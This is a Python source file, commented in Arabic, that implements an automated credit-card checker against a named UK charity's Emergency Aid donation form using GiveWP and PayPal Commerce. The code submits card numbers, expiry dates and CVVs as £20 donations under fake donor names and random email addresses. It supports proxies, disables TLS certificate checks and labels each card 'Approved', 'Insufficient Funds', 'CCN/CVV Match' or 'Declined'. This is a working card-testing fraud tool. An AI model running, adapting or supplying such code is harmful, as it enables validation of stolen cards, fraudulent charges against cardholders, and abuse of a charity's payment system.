"""
بوابة الدفع: PayPal Charge Single (GiveWP)
الموقع: hasene.org.uk
نوع البوابة: PayPal Commerce Platform (GiveWP)
تدفق الطلبات:
1. POST /donations/emergencyaid/?payment-mode=paypal-commerce&form-id=3331 -> إرسال بيانات البطاقة وتصنيف النتيجة
"""
import aiohttp
import asyncio
import uuid
import ssl
import re


async def req1_submit_donation(
    session: aiohttp.ClientSession,
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 1: إرسال طلب التبرع عبر GiveWP PayPal Commerce."""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://hasene.org.uk",
        "Referer": "https://hasene.org.uk/donations/emergencyaid/",
    }
    data = {
        "give-honeypot": "",
        "give-form-id-prefix": "3331-1",
        "give-form-id": "3331",
        "give-form-title": "Emergency Aid",
        "give-current-url": "https://hasene.org.uk/donations/emergencyaid/",
        "give-form-url": "https://hasene.org.uk/donations/emergencyaid/",
        "give-form-minimum": "10.00",
        "give-form-maximum": "5000.00",
        "give-form-hash": "4bf6d01881",
        "give_recurring_donation_details": '{"is_recurring":false}',
        "give-amount": "20.00",
        "payment-mode": "paypal-commerce",
        "give_first": "John",
        "give_last": "Doe",
        "give_email": f"test{uuid.uuid4().hex[:8]}@gmail.com",
        "phone": "07712345678",
        "card_number": cc,
        "card_cvc": cvv,
        "card_name": "John Doe",
        "card_exp_month": mm,
        "card_exp_year": yy,
        "card_expiry": f"{mm}/{yy}",
        "give_gift_aid_accept_term_condition": "on",
        "give_agree_to_terms": "1",
        "give_action": "purchase",
        "give-gateway": "paypal-commerce",
    }
    try:
        async with session.post(
            "https://hasene.org.uk/donations/emergencyaid/?payment-mode=paypal-commerce&form-id=3331",
            data=data,
            headers=headers,
            proxy=proxy_url,
        ) as r:
            return await r.text()
    except Exception as e:
        raise RuntimeError(f"req1_submit_donation failed: {e}") from e


async def process_paypal_3(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة PayPal Charge Single (GiveWP)."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            response_text = await req1_submit_donation(session, cc, mes, ano, cvv, proxy_url)

    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"

    rt_lower = response_text.lower()

    if "thank you" in rt_lower or "success" in rt_lower:
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "Approved"
    elif "insufficient funds" in rt_lower:
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "Insufficient Funds"
    elif "security code is incorrect" in rt_lower or "cvv" in rt_lower:
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "CCN/CVV Match"
    elif "declined" in rt_lower:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", "Declined"
    else:
        error_match = re.search(r'class="give-error">([^<]+)<', response_text)
        error_msg = error_match.group(1) if error_match else "Transaction Failed"
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", error_msg
